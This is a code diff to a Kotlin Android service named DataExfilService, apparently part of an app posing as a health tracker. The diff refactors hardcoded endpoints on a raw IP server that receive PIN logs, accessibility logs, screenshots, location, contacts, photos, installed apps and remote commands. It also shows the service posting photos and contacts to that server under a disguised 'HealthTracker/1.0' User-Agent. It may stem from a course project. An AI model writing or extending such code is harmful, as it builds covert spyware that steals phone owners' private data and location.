@@ -30,10 +30,6 @@ import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
 import android.provider.ContactsContract
-import java.net.Inet4Address
-import java.net.NetworkInterface
-import java.util.Collections
-import android.graphics.Bitmap
 import android.provider.Settings
 import android.provider.CallLog
 import com.inf2007.healthtracker.R
@@ -51,21 +47,19 @@ class DataExfilService : Service() {
 
     companion object {
         const val TAG = "DataExfilService"
+        private const val BASE_URL = "http://20.2.92.176:5000"
         private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
         private const val NOTIFICATION_ID = 1001
-        private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"
-        private const val PIN_ENDPOINT = "http://20.2.92.176:5000/pin_logs"
-        private const val DOWNLOADS_ENDPOINT = "http://20.2.92.176:5000/downloads"
-        private const val SCREENSHOT_ENDPOINT = "http://20.2.92.176:5000/screenshots"
-        private const val COMMAND_ENDPOINT = "http://20.2.92.176:5000/commands"
-        private const val VIDEO_ENDPOINT = "http://20.2.92.176:5000/videos"
-        private const val USER_APPS_ENDPOINT = "http://20.2.92.176:5000/user_apps"
-        private const val LOCATION_ENDPOINT = "http://20.2.92.176:5000/location_updates"
-        private const val LOCATION_HISTORY_ENDPOINT = "http://20.2.92.176:5000/location_history"
+        private const val SERVER_ENDPOINT = "$BASE_URL/accessibility_logs"
+        private const val PIN_ENDPOINT = "$BASE_URL/pin_logs"
+        private const val DOWNLOADS_ENDPOINT = "$BASE_URL/downloads"
+        private const val COMMAND_ENDPOINT = "$BASE_URL/commands"
+        private const val VIDEO_ENDPOINT = "$BASE_URL/videos"
+        private const val USER_APPS_ENDPOINT = "$BASE_URL/user_apps"
+        private const val LOCATION_ENDPOINT = "$BASE_URL/location_update"
+        private const val PHOTOS_ENDPOINT = "$BASE_URL/photos"
+        private const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
     }
-
-    private val photosEndpoint = "http://20.2.92.176:5000/photos"
-    private val contactsEndpoint = "http://20.2.92.176:5000/contacts"
 
     private lateinit var photoObserver: ContentObserver
     private lateinit var contactsObserver: ContentObserver
@@ -97,7 +91,6 @@ class DataExfilService : Service() {
     // Location constants
     private val LOCATION_SEND_INTERVAL = 30000L  // Send every 30 seconds
     private val MIN_MOVEMENT_DISTANCE = 10.0f     // 10 meters
-    private val LOCATION_ENDPOINT = "http://20.2.92.176:5000/location_update"
 
     private val uploadRunnable = object : Runnable {
         override fun run() {
@@ -525,7 +518,7 @@ class DataExfilService : Service() {
                 .build()
 
             val request = Request.Builder()
-                .url(photosEndpoint)
+                .url(PHOTOS_ENDPOINT)
                 .post(requestBody)
                 .build()
 
@@ -671,7 +664,7 @@ class DataExfilService : Service() {
                 .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
 
             val request = Request.Builder()
-                .url(contactsEndpoint)
+                .url(CONTACTS_ENDPOINT)
                 .post(requestBody)
                 .addHeader("User-Agent", "HealthTracker/1.0")
                 .build()
